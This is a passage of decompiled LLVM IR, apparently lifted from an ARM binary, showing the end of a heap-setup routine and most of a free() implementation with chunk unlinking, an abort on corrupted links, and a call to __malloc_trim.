  %v1_11a28 = load i32, i32* @r4, align 4
  %v2_11a28 = add i32 %v1_11a28, 44
  %v3_11a28 = inttoptr i32 %v2_11a28 to i32*
  store i32 %v0_11a28, i32* %v3_11a28, align 4
  br label %dec_label_pc_11a2c

dec_label_pc_11a2c:                               ; preds = %dec_label_pc_119f8, %dec_label_pc_11a1c
  %v0_11a2c = load i32, i32* %sl.global-to-local, align 4
  %v2_11a2c = icmp eq i32 %v0_11a2c, 0
  store i32 %v0_11a2c, i32* %r1.global-to-local, align 4
  br i1 %v2_11a2c, label %dec_label_pc_11a38.loopexit, label %dec_label_pc_11954

dec_label_pc_11a38.loopexit:                      ; preds = %dec_label_pc_11a2c
  %v0_11a38.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_11a38.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_11a38

dec_label_pc_11a38:                               ; preds = %dec_label_pc_11a38.loopexit, %dec_label_pc_11944
  %v1_11a38 = phi i32 [ %v1_11a38.pre, %dec_label_pc_11a38.loopexit ], [ %v1_11a3810, %dec_label_pc_11944 ]
  %v0_11a40 = phi i32 [ %v0_11a38.pre, %dec_label_pc_11a38.loopexit ], [ %v1_11950, %dec_label_pc_11944 ]
  %v9_11a38 = icmp eq i32 %v0_11a40, %v1_11a38
  br i1 %v9_11a38, label %dec_label_pc_11ab0, label %dec_label_pc_11a40

dec_label_pc_11a40:                               ; preds = %dec_label_pc_11a38
  %v1_11a40 = add i32 %v0_11a40, 4
  store i32 %v1_11a40, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_11944

dec_label_pc_11a48.dec_label_pc_11a48_crit_edge:  ; preds = %dec_label_pc_11a48.preheader, %dec_label_pc_11a48.dec_label_pc_11a48_crit_edge
  %v0_11a48.pre = load i32, i32* @r4, align 4
  %v1_11a48.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_11a48 = mul i32 %v1_11a48.pre, 8
  %v5_11a48 = add i32 %v4_11a48, %v0_11a48.pre
  %v1_11a4c = add i32 %v1_11a48.pre, 1
  store i32 %v1_11a4c, i32* %r2.global-to-local, align 4
  %v1_11a50 = add i32 %v5_11a48, 44
  store i32 %v1_11a50, i32* %r3.global-to-local, align 4
  %v2_11a58 = add i32 %v5_11a48, 52
  %v3_11a58 = inttoptr i32 %v2_11a58 to i32*
  store i32 %v1_11a50, i32* %v3_11a58, align 4
  %v0_11a5c = load i32, i32* %r3.global-to-local, align 4
  %v2_11a5c = add i32 %v0_11a5c, 12
  %v3_11a5c = inttoptr i32 %v2_11a5c to i32*
  store i32 %v0_11a5c, i32* %v3_11a5c, align 4
  %v7_11a60 = icmp sgt i32 %v1_11a4c, 95
  br i1 %v7_11a60, label %dec_label_pc_11a64, label %dec_label_pc_11a48.dec_label_pc_11a48_crit_edge

dec_label_pc_11a64:                               ; preds = %dec_label_pc_11a48.dec_label_pc_11a48_crit_edge
  %v0_11a64 = load i32, i32* @r4, align 4
  %v1_11a64 = inttoptr i32 %v0_11a64 to i32*
  %v2_11a64 = load i32, i32* %v1_11a64, align 4
  store i32 %v2_11a64, i32* %r2.global-to-local, align 4
  %v1_11a68 = add i32 %v0_11a64, 864
  %v2_11a68 = inttoptr i32 %v1_11a68 to i32*
  %v3_11a68 = load i32, i32* %v2_11a68, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_11a70 = urem i32 %v2_11a64, 4
  store i32 262144, i32* %r0.global-to-local, align 4
  %v1_11a78 = or i32 %v3_11a68, 1
  store i32 %v1_11a78, i32* %r1.global-to-local, align 4
  %v1_11a7c = or i32 %v1_11a70, 72
  store i32 %v1_11a7c, i32* %r2.global-to-local, align 4
  %v1_11a80 = add i32 %v0_11a64, 52
  store i32 %v1_11a80, i32* %ip.global-to-local, align 4
  %v2_11a84 = add i32 %v0_11a64, 840
  %v3_11a84 = inttoptr i32 %v2_11a84 to i32*
  store i32 0, i32* %v3_11a84, align 4
  %v0_11a88 = load i32, i32* %r3.global-to-local, align 4
  %v1_11a88 = add i32 %v0_11a88, 65536
  store i32 %v1_11a88, i32* %r3.global-to-local, align 4
  %v0_11a8c = load i32, i32* %r0.global-to-local, align 4
  %v1_11a8c = load i32, i32* @r4, align 4
  %v2_11a8c = add i32 %v1_11a8c, 836
  %v3_11a8c = inttoptr i32 %v2_11a8c to i32*
  store i32 %v0_11a8c, i32* %v3_11a8c, align 4
  %v0_11a90 = load i32, i32* %r0.global-to-local, align 4
  %v1_11a90 = load i32, i32* @r4, align 4
  %v2_11a90 = add i32 %v1_11a90, 844
  %v3_11a90 = inttoptr i32 %v2_11a90 to i32*
  store i32 %v0_11a90, i32* %v3_11a90, align 4
  %v1_11a94 = load i32, i32* @r4, align 4
  %v2_11a94 = add i32 %v1_11a94, 852
  %v3_11a94 = inttoptr i32 %v2_11a94 to i32*
  store i32 %v1_11a88, i32* %v3_11a94, align 4
  %v1_11a98 = load i32, i32* @r4, align 4
  %v2_11a98 = add i32 %v1_11a98, 864
  %v3_11a98 = inttoptr i32 %v2_11a98 to i32*
  store i32 %v1_11a78, i32* %v3_11a98, align 4
  %v1_11a9c = load i32, i32* @r4, align 4
  %v2_11a9c = inttoptr i32 %v1_11a9c to i32*
  store i32 %v1_11a7c, i32* %v2_11a9c, align 4
  %v0_11aa0 = load i32, i32* %ip.global-to-local, align 4
  %v1_11aa0 = load i32, i32* @r4, align 4
  %v2_11aa0 = add i32 %v1_11aa0, 44
  %v3_11aa0 = inttoptr i32 %v2_11aa0 to i32*
  store i32 %v0_11aa0, i32* %v3_11aa0, align 4
  store i32 30, i32* %r0.global-to-local, align 4
  %v4_11aa8 = call i32 @sysconf(i32 30, i32 %v1_11a78, i32 %v1_11a7c, i32 %v1_11a88)
  store i32 %v4_11aa8, i32* @r0, align 4
  %v1_11aac = load i32, i32* @r4, align 4
  %v2_11aac = add i32 %v1_11aac, 860
  %v3_11aac = inttoptr i32 %v2_11aac to i32*
  store i32 %v4_11aa8, i32* %v3_11aac, align 4
  br label %dec_label_pc_11ab0

dec_label_pc_11ab0:                               ; preds = %dec_label_pc_11a38, %dec_label_pc_11a64
  %v2_11ab4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_11ab4, i32* @r4, align 4
  %v1_11ab8 = load i32, i32* @r0, align 4
  ret i32 %v1_11ab8

; uselistorder directives
  uselistorder i32 %v0_11a64, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11a5c, { 1, 0 }
  uselistorder i32 %v1_11a40, { 1, 0 }
  uselistorder i32 %v0_11a2c, { 0, 2, 1 }
  uselistorder i32 %v0_11a08, { 1, 0 }
  uselistorder i32 %v1_11958, { 1, 0, 2 }
  uselistorder i32 %v0_11970, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_11930, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0, 1, 19 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 2, 3, 12 }
  uselistorder i32* %lr.global-to-local, { 3, 0, 4, 2, 1, 5, 6 }
  uselistorder i32 860, { 1, 0, 2, 3 }
  uselistorder i32 30, { 1, 5, 0, 3, 4, 2 }
  uselistorder label %dec_label_pc_11ab0, { 1, 0 }
  uselistorder label %dec_label_pc_11a48.dec_label_pc_11a48_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_11a2c, { 1, 0 }
  uselistorder label %dec_label_pc_119f8, { 1, 0 }
  uselistorder label %dec_label_pc_119ec, { 1, 0 }
  uselistorder label %dec_label_pc_119e8, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_119a4, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_11abc = load i32, i32* @r4, align 4
  %v6_11abc = load i32, i32* @r5, align 4
  %v9_11abc = load i32, i32* @r6, align 4
  %v12_11abc = load i32, i32* @r7, align 4
  %v18_11abc = load i32, i32* @lr, align 4
  %v0_11ac4 = load i32, i32* @r0, align 4
  store i32 %v0_11ac4, i32* @r6, align 4
  %v2_11ac4 = icmp eq i32 %v0_11ac4, 0
  %v2_11ac8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r7, align 4
  br i1 %v2_11ac4, label %dec_label_pc_11cd0, label %dec_label_pc_11ad4

dec_label_pc_11ad4:                               ; preds = %entry
  store i32 108, i32* %r3.global-to-local, align 4
  %v4_11ad8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 108) to i32*), align 4
  store i32 %v4_11ad8, i32* %r4.global-to-local, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 %v4_11ad8, i32* %r2.global-to-local, align 4
  %v4_11ae4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 68) to i32*), align 4
  store i32 %v4_11ae4, i32* %r1.global-to-local, align 4
  store i32 %v2_11ac8, i32* %r0.global-to-local, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v4_11af0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 112) to i32*), align 4
  store i32 %v4_11af0, i32* %ip.global-to-local, align 4
  store i32 72444, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11af0)
  %v0_11afc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11afc, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_11b04 = load i32, i32* @r7, align 4
  %v2_11b04 = add i32 %v0_11b04, 16
  %v3_11b04 = inttoptr i32 %v2_11b04 to i32*
  %v4_11b04 = load i32, i32* %v3_11b04, align 4
  store i32 %v4_11b04, i32* %ip.global-to-local, align 4
  store i32 72464, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11b04)
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11b14 = load i32, i32* @r7, align 4
  %v2_11b14 = add i32 %v0_11b14, 64
  %v3_11b14 = inttoptr i32 %v2_11b14 to i32*
  %v4_11b14 = load i32, i32* %v3_11b14, align 4
  store i32 %v4_11b14, i32* @lr, align 4
  %v0_11b18 = load i32, i32* @r6, align 4
  %v1_11b18 = add i32 %v0_11b18, -4
  %v2_11b18 = inttoptr i32 %v1_11b18 to i32*
  %v3_11b18 = load i32, i32* %v2_11b18, align 4
  store i32 %v3_11b18, i32* %r2.global-to-local, align 4
  %v1_11b1c = inttoptr i32 %v4_11b14 to i32*
  %v2_11b1c = load i32, i32* %v1_11b1c, align 4
  store i32 %v2_11b1c, i32* %r3.global-to-local, align 4
  %v1_11b20 = and i32 %v3_11b18, -4
  store i32 %v1_11b20, i32* %ip.global-to-local, align 4
  %v1_11b24 = add i32 %v0_11b18, -8
  store i32 %v1_11b24, i32* @r5, align 4
  store i32 %v1_11b24, i32* %r4.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_11b20, %v2_11b1c
  br i1 %tmp, label %dec_label_pc_11b54, label %dec_label_pc_11b34

dec_label_pc_11b34:                               ; preds = %dec_label_pc_11ad4
  %v1_11b34 = or i32 %v2_11b1c, 3
  store i32 %v1_11b34, i32* %r3.global-to-local, align 4
  store i32 %v1_11b34, i32* %v1_11b1c, align 4
  %v3_11b38 = load i32, i32* @lr, align 4
  %v4_11b38 = add i32 %v3_11b38, -8
  store i32 %v4_11b38, i32* %lr.global-to-local, align 4
  %v0_11b3c = load i32, i32* %ip.global-to-local, align 4
  %v3_11b3c = udiv i32 %v0_11b3c, 8
  store i32 %v3_11b3c, i32* %r1.global-to-local, align 4
  %v1_11b40 = add i32 %v3_11b38, -4
  store i32 %v1_11b40, i32* %r2.global-to-local, align 4
  %v4_11b44 = mul nuw i32 %v3_11b3c, 4
  %v5_11b44 = add i32 %v4_11b44, %v1_11b40
  %v6_11b44 = inttoptr i32 %v5_11b44 to i32*
  %v7_11b44 = load i32, i32* %v6_11b44, align 4
  store i32 %v7_11b44, i32* %r3.global-to-local, align 4
  %v1_11b48 = load i32, i32* @r5, align 4
  %v2_11b48 = add i32 %v1_11b48, 8
  %v3_11b48 = inttoptr i32 %v2_11b48 to i32*
  store i32 %v7_11b44, i32* %v3_11b48, align 4
  %v0_11b4c = load i32, i32* @r5, align 4
  %v1_11b4c = load i32, i32* %r2.global-to-local, align 4
  %v2_11b4c = load i32, i32* %r1.global-to-local, align 4
  %v5_11b4c = mul i32 %v2_11b4c, 4
  %v6_11b4c = add i32 %v5_11b4c, %v1_11b4c
  %v7_11b4c = inttoptr i32 %v6_11b4c to i32*
  store i32 %v0_11b4c, i32* %v7_11b4c, align 4
  br label %dec_label_pc_11cb8

dec_label_pc_11b54:                               ; preds = %dec_label_pc_11ad4
  %v1_11b54 = and i32 %v3_11b18, 2
  %v2_11b54 = icmp eq i32 %v1_11b54, 0
  br i1 %v2_11b54, label %dec_label_pc_11b5c, label %dec_label_pc_11c90

dec_label_pc_11b5c:                               ; preds = %dec_label_pc_11b54
  %v1_11b5c = or i32 %v2_11b1c, 1
  store i32 %v1_11b5c, i32* %r3.global-to-local, align 4
  store i32 %v1_11b5c, i32* %v1_11b1c, align 4
  %v0_11b64 = load i32, i32* @r6, align 4
  %v1_11b64 = add i32 %v0_11b64, -4
  %v2_11b64 = inttoptr i32 %v1_11b64 to i32*
  %v3_11b64 = load i32, i32* %v2_11b64, align 4
  store i32 %v3_11b64, i32* %r3.global-to-local, align 4
  %v0_11b68 = load i32, i32* @r5, align 4
  %v1_11b68 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b68 = add i32 %v1_11b68, %v0_11b68
  store i32 %v2_11b68, i32* %lr.global-to-local, align 4
  %v1_11b6c = urem i32 %v3_11b64, 2
  %v2_11b6c = icmp eq i32 %v1_11b6c, 0
  %v1_11b70 = add i32 %v2_11b68, 4
  %v2_11b70 = inttoptr i32 %v1_11b70 to i32*
  %v3_11b70 = load i32, i32* %v2_11b70, align 4
  store i32 %v3_11b70, i32* %r8.global-to-local, align 4
  br i1 %v2_11b6c, label %dec_label_pc_11b78, label %dec_label_pc_11bac

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b5c
  %v1_11b78 = add i32 %v0_11b64, -8
  %v2_11b78 = inttoptr i32 %v1_11b78 to i32*
  %v3_11b78 = load i32, i32* %v2_11b78, align 4
  store i32 %v3_11b78, i32* %r1.global-to-local, align 4
  %v2_11b7c = sub i32 %v0_11b68, %v3_11b78
  store i32 %v2_11b7c, i32* %r3.global-to-local, align 4
  %v1_11b80 = add i32 %v2_11b7c, 8
  %v2_11b80 = inttoptr i32 %v1_11b80 to i32*
  %v3_11b80 = load i32, i32* %v2_11b80, align 4
  store i32 %v3_11b80, i32* %r2.global-to-local, align 4
  %v1_11b84 = add i32 %v3_11b80, 12
  %v2_11b84 = inttoptr i32 %v1_11b84 to i32*
  %v3_11b84 = load i32, i32* %v2_11b84, align 4
  store i32 %v3_11b84, i32* %r4.global-to-local, align 4
  %v9_11b88 = icmp eq i32 %v3_11b84, %v2_11b7c
  %v1_11b8c = add i32 %v2_11b7c, 12
  %v2_11b8c = inttoptr i32 %v1_11b8c to i32*
  %v3_11b8c = load i32, i32* %v2_11b8c, align 4
  store i32 %v3_11b8c, i32* %r0.global-to-local, align 4
  br i1 %v9_11b88, label %dec_label_pc_11b94, label %dec_label_pc_11bf8

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b78
  %v1_11b94 = add i32 %v3_11b8c, 8
  %v2_11b94 = inttoptr i32 %v1_11b94 to i32*
  %v3_11b94 = load i32, i32* %v2_11b94, align 4
  store i32 %v3_11b94, i32* %r3.global-to-local, align 4
  %v9_11b98 = icmp eq i32 %v3_11b94, %v2_11b7c
  br i1 %v9_11b98, label %dec_label_pc_11ba0, label %dec_label_pc_11bf8

dec_label_pc_11ba0:                               ; preds = %dec_label_pc_11b94
  store i32 %v3_11b80, i32* %v2_11b94, align 4
  %v0_11ba4 = load i32, i32* %r0.global-to-local, align 4
  %v1_11ba4 = load i32, i32* %r2.global-to-local, align 4
  %v2_11ba4 = add i32 %v1_11ba4, 12
  %v3_11ba4 = inttoptr i32 %v2_11ba4 to i32*
  store i32 %v0_11ba4, i32* %v3_11ba4, align 4
  %v0_11ba8 = load i32, i32* %ip.global-to-local, align 4
  %v1_11ba8 = load i32, i32* %r1.global-to-local, align 4
  %v2_11ba8 = add i32 %v1_11ba8, %v0_11ba8
  store i32 %v2_11ba8, i32* %ip.global-to-local, align 4
  %v0_11bb8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11bbc.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_11bac

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11b5c, %dec_label_pc_11ba0
  %v0_11c38 = phi i32 [ %v1_11b68, %dec_label_pc_11b5c ], [ %v2_11ba8, %dec_label_pc_11ba0 ]
  %v0_11bbc = phi i32 [ %v3_11b70, %dec_label_pc_11b5c ], [ %v0_11bbc.pre, %dec_label_pc_11ba0 ]
  %v1_11bd0 = phi i32 [ %v2_11b68, %dec_label_pc_11b5c ], [ %v0_11bb8.pre, %dec_label_pc_11ba0 ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11bb0 = load i32, i32* @r7, align 4
  %v2_11bb0 = add i32 %v0_11bb0, 64
  %v3_11bb0 = inttoptr i32 %v2_11bb0 to i32*
  %v4_11bb0 = load i32, i32* %v3_11bb0, align 4
  store i32 %v4_11bb0, i32* %r2.global-to-local, align 4
  %v1_11bb4 = add i32 %v4_11bb0, 44
  %v2_11bb4 = inttoptr i32 %v1_11bb4 to i32*
  %v3_11bb4 = load i32, i32* %v2_11bb4, align 4
  store i32 %v3_11bb4, i32* %r3.global-to-local, align 4
  %v9_11bb8 = icmp eq i32 %v1_11bd0, %v3_11bb4
  %v1_11bbc = and i32 %v0_11bbc, -4
  store i32 %v1_11bbc, i32* %r0.global-to-local, align 4
  br i1 %v9_11bb8, label %dec_label_pc_11c38, label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11bac
  %v2_11bc4 = add i32 %v1_11bd0, %v1_11bbc
  store i32 %v2_11bc4, i32* %r3.global-to-local, align 4
  %v1_11bc8 = add i32 %v2_11bc4, 4
  %v2_11bc8 = inttoptr i32 %v1_11bc8 to i32*
  %v3_11bc8 = load i32, i32* %v2_11bc8, align 4
  store i32 %v3_11bc8, i32* %r3.global-to-local, align 4
  %v1_11bcc = urem i32 %v3_11bc8, 2
  %v2_11bcc = icmp eq i32 %v1_11bcc, 0
  %v2_11bd0 = add i32 %v1_11bd0, 4
  %v3_11bd0 = inttoptr i32 %v2_11bd0 to i32*
  store i32 %v1_11bbc, i32* %v3_11bd0, align 4
  br i1 %v2_11bcc, label %dec_label_pc_11bd8, label %dec_label_pc_11bc4.dec_label_pc_11c08_crit_edge

dec_label_pc_11bc4.dec_label_pc_11c08_crit_edge:  ; preds = %dec_label_pc_11bc4
  %v0_11c18.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c08

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11bc4
  %v0_11bd8 = load i32, i32* %lr.global-to-local, align 4
  %v1_11bd8 = add i32 %v0_11bd8, 8
  %v2_11bd8 = inttoptr i32 %v1_11bd8 to i32*
  %v3_11bd8 = load i32, i32* %v2_11bd8, align 4
  store i32 %v3_11bd8, i32* %r1.global-to-local, align 4
  %v1_11bdc = add i32 %v3_11bd8, 12
  %v2_11bdc = inttoptr i32 %v1_11bdc to i32*
  %v3_11bdc = load i32, i32* %v2_11bdc, align 4
  store i32 %v3_11bdc, i32* %r3.global-to-local, align 4
  %v9_11be0 = icmp eq i32 %v3_11bdc, %v0_11bd8
  %v1_11be4 = add i32 %v0_11bd8, 12
  %v2_11be4 = inttoptr i32 %v1_11be4 to i32*
  %v3_11be4 = load i32, i32* %v2_11be4, align 4
  store i32 %v3_11be4, i32* %r2.global-to-local, align 4
  br i1 %v9_11be0, label %dec_label_pc_11bec, label %dec_label_pc_11bf8

dec_label_pc_11bec:                               ; preds = %dec_label_pc_11bd8
  %v1_11bec = add i32 %v3_11be4, 8
  %v2_11bec = inttoptr i32 %v1_11bec to i32*
  %v3_11bec = load i32, i32* %v2_11bec, align 4
  store i32 %v3_11bec, i32* %r3.global-to-local, align 4
  %v9_11bf0 = icmp eq i32 %v3_11bec, %v0_11bd8
  br i1 %v9_11bf0, label %dec_label_pc_11bfc, label %dec_label_pc_11bf8

dec_label_pc_11bf8:                               ; preds = %dec_label_pc_11bd8, %dec_label_pc_11b94, %dec_label_pc_11b78, %dec_label_pc_11bec
  %v0_11bf8 = call i32 @abort()
  store i32 %v0_11bf8, i32* %r0.global-to-local, align 4
  %v0_11bfc.pre = load i32, i32* @r1, align 4
  %v1_11bfc.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11bfc

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11bec, %dec_label_pc_11bf8
  %v1_11bfc = phi i32 [ %v3_11be4, %dec_label_pc_11bec ], [ %v1_11bfc.pre, %dec_label_pc_11bf8 ]
  %v0_11bfc = phi i32 [ %v3_11bd8, %dec_label_pc_11bec ], [ %v0_11bfc.pre, %dec_label_pc_11bf8 ]
  %v2_11bfc = add i32 %v1_11bfc, 8
  %v3_11bfc = inttoptr i32 %v2_11bfc to i32*
  store i32 %v0_11bfc, i32* %v3_11bfc, align 4
  %v0_11c00 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c00 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c00 = add i32 %v1_11c00, 12
  %v3_11c00 = inttoptr i32 %v2_11c00 to i32*
  store i32 %v0_11c00, i32* %v3_11c00, align 4
  %v0_11c04 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c04 = load i32, i32* %r0.global-to-local, align 4
  %v2_11c04 = add i32 %v1_11c04, %v0_11c04
  store i32 %v2_11c04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c08

dec_label_pc_11c08:                               ; preds = %dec_label_pc_11bc4.dec_label_pc_11c08_crit_edge, %dec_label_pc_11bfc
  %v0_11c18 = phi i32 [ %v0_11c18.pre, %dec_label_pc_11bc4.dec_label_pc_11c08_crit_edge ], [ %v2_11c04, %dec_label_pc_11bfc ]
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11c0c = load i32, i32* @r7, align 4
  %v2_11c0c = add i32 %v0_11c0c, 64
  %v3_11c0c = inttoptr i32 %v2_11c0c to i32*
  %v4_11c0c = load i32, i32* %v3_11c0c, align 4
  %v1_11c10 = add i32 %v4_11c0c, 52
  store i32 %v1_11c10, i32* %r3.global-to-local, align 4
  %v1_11c14 = add i32 %v4_11c0c, 60
  %v2_11c14 = inttoptr i32 %v1_11c14 to i32*
  %v3_11c14 = load i32, i32* %v2_11c14, align 4
  store i32 %v3_11c14, i32* %r1.global-to-local, align 4
  %v1_11c18 = or i32 %v0_11c18, 1
  store i32 %v1_11c18, i32* %r2.global-to-local, align 4
  %v1_11c1c = load i32, i32* %r4.global-to-local, align 4
  %v2_11c1c = add i32 %v1_11c1c, 12
  %v3_11c1c = inttoptr i32 %v2_11c1c to i32*
  store i32 %v1_11c10, i32* %v3_11c1c, align 4
  %v0_11c20 = load i32, i32* %r1.global-to-local, align 4
  %v1_11c20 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c20 = add i32 %v1_11c20, 8
  %v3_11c20 = inttoptr i32 %v2_11c20 to i32*
  store i32 %v0_11c20, i32* %v3_11c20, align 4
  %v0_11c24 = load i32, i32* %r2.global-to-local, align 4
  %v1_11c24 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c24 = add i32 %v1_11c24, 4
  %v3_11c24 = inttoptr i32 %v2_11c24 to i32*
  store i32 %v0_11c24, i32* %v3_11c24, align 4
  %v0_11c28 = load i32, i32* %ip.global-to-local, align 4
  %v1_11c28 = load i32, i32* %r4.global-to-local, align 4
  %v3_11c28 = add i32 %v1_11c28, %v0_11c28
  %v4_11c28 = inttoptr i32 %v3_11c28 to i32*
  store i32 %v0_11c28, i32* %v4_11c28, align 4
  %v0_11c2c = load i32, i32* %r4.global-to-local, align 4
  %v1_11c2c = load i32, i32* %r1.global-to-local, align 4
  %v2_11c2c = add i32 %v1_11c2c, 12
  %v3_11c2c = inttoptr i32 %v2_11c2c to i32*
  store i32 %v0_11c2c, i32* %v3_11c2c, align 4
  %v0_11c30 = load i32, i32* %r4.global-to-local, align 4
  %v1_11c30 = load i32, i32* %r3.global-to-local, align 4
  %v2_11c30 = add i32 %v1_11c30, 8
  %v3_11c30 = inttoptr i32 %v2_11c30 to i32*
  store i32 %v0_11c30, i32* %v3_11c30, align 4
  br label %dec_label_pc_11c48

dec_label_pc_11c38:                               ; preds = %dec_label_pc_11bac
  %v2_11c38 = add i32 %v1_11bbc, %v0_11c38
  store i32 %v2_11c38, i32* %ip.global-to-local, align 4
  %v1_11c3c = or i32 %v2_11c38, 1
  store i32 %v1_11c3c, i32* %r3.global-to-local, align 4
  %v0_11c40 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_11c40, i32* %v2_11bb4, align 4
  %v0_11c44 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c44 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c44 = add i32 %v1_11c44, 4
  %v3_11c44 = inttoptr i32 %v2_11c44 to i32*
  store i32 %v0_11c44, i32* %v3_11c44, align 4
  br label %dec_label_pc_11c48

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c08, %dec_label_pc_11c38
  %v0_11c48 = load i32, i32* %ip.global-to-local, align 4
  %v3_11c4c = icmp ult i32 %v0_11c48, 131070
  br i1 %v3_11c4c, label %dec_label_pc_11cb8, label %dec_label_pc_11c50

dec_label_pc_11c50:                               ; preds = %dec_label_pc_11c48
  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11c54 = load i32, i32* @r7, align 4
  %v2_11c54 = add i32 %v0_11c54, 64
  %v3_11c54 = inttoptr i32 %v2_11c54 to i32*
  %v4_11c54 = load i32, i32* %v3_11c54, align 4
  store i32 %v4_11c54, i32* @r4, align 4
  %v1_11c58 = inttoptr i32 %v4_11c54 to i32*
  %v2_11c58 = load i32, i32* %v1_11c58, align 4
  store i32 %v2_11c58, i32* %r3.global-to-local, align 4
  %v1_11c5c = and i32 %v2_11c58, 2
  %v2_11c5c = icmp eq i32 %v1_11c5c, 0
  br i1 %v2_11c5c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_11c50
  store i32 %v4_11c54, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_11c50, %bb
  %v1_11c64 = xor i1 %v2_11c5c, true
  call void @__pseudo_cond_branch(i1 %v1_11c64, i32 ptrtoint (i32* @global_var_11908.696 to i32))
  %v0_11c68 = load i32, i32* @r4, align 4
  %v1_11c68 = add i32 %v0_11c68, 44
  %v2_11c68 = inttoptr i32 %v1_11c68 to i32*
  %v3_11c68 = load i32, i32* %v2_11c68, align 4
  store i32 %v3_11c68, i32* %r3.global-to-local, align 4
  %v1_11c6c = add i32 %v3_11c68, 4
  %v2_11c6c = inttoptr i32 %v1_11c6c to i32*
  %v3_11c6c = load i32, i32* %v2_11c6c, align 4
  store i32 %v3_11c6c, i32* %r3.global-to-local, align 4
  %v1_11c70 = add i32 %v0_11c68, 836
  %v2_11c70 = inttoptr i32 %v1_11c70 to i32*
  %v3_11c70 = load i32, i32* %v2_11c70, align 4
  store i32 %v3_11c70, i32* %r2.global-to-local, align 4
  %v1_11c74 = and i32 %v3_11c6c, -4
  store i32 %v1_11c74, i32* %r3.global-to-local, align 4
  %v3_11c78 = icmp ult i32 %v1_11c74, %v3_11c70
  br i1 %v3_11c78, label %dec_label_pc_11cb8, label %dec_label_pc_11c80

dec_label_pc_11c80:                               ; preds = %bb16
  store i32 %v0_11c68, i32* %r1.global-to-local, align 4
  %v1_11c84 = add i32 %v0_11c68, 840
  %v2_11c84 = inttoptr i32 %v1_11c84 to i32*
  %v3_11c84 = load i32, i32* %v2_11c84, align 4
  store i32 %v3_11c84, i32* %r0.global-to-local, align 4
  %v2_11c88 = call i32 @__malloc_trim(i32 %v3_11c84, i32 %v0_11c68)
  store i32 %v2_11c88, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cb8

dec_label_pc_11c90:                               ; preds = %dec_label_pc_11b54
  %v2_11c90 = inttoptr i32 %v1_11b24 to i32*
  %v3_11c90 = load i32, i32* %v2_11c90, align 4
  store i32 %v3_11c90, i32* %r0.global-to-local, align 4
  %v1_11c94 = add i32 %v4_11b14, 848
  %v2_11c94 = inttoptr i32 %v1_11c94 to i32*
  %v3_11c94 = load i32, i32* %v2_11c94, align 4
  store i32 %v3_11c94, i32* %r2.global-to-local, align 4
  %v1_11c98 = add i32 %v4_11b14, 868
  %v2_11c98 = inttoptr i32 %v1_11c98 to i32*
  %v3_11c98 = load i32, i32* %v2_11c98, align 4
  %v2_11c9c = add i32 %v3_11c90, %v1_11b20
  store i32 %v2_11c9c, i32* %r1.global-to-local, align 4
